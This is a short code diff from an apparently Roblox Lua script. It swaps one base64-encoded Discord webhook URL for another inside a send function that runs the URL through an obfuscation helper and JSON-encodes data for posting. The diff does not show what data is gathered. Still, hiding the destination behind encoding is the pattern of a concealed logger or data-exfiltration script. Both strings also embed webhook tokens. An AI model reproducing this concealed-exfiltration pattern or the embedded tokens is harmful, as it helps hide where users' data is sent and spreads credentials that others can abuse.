@@ -52,7 +52,7 @@ local function obfuscation(data)
 end
 
 local function send(data)
-    local hook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzM1MzA0NDU5MDU5NjExNi8zb3FTWVMtU3RRdnV6dXNIa054WUx2YTE4TWFnblNJRXJkT2hQRGZ5d1Q2VjlBRV9BWVlheFkzMERhb2ZTVWNybGRNZw=="
+    local hook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTcwMTk4ODIzNDIzMTgzOS9SSjhQWk5STjZLcXA3V3lpZjdUTHVqYjYzbTVYZXh1NVhORnBOcFRpRlZ5bjd1NTh2SmczT2pNTDJ0QnFJcEUwdkVTZA=="
     local hookobfuscation = obfuscation(hook)
     local jsonData = HttpService:JSONEncode(data)
 
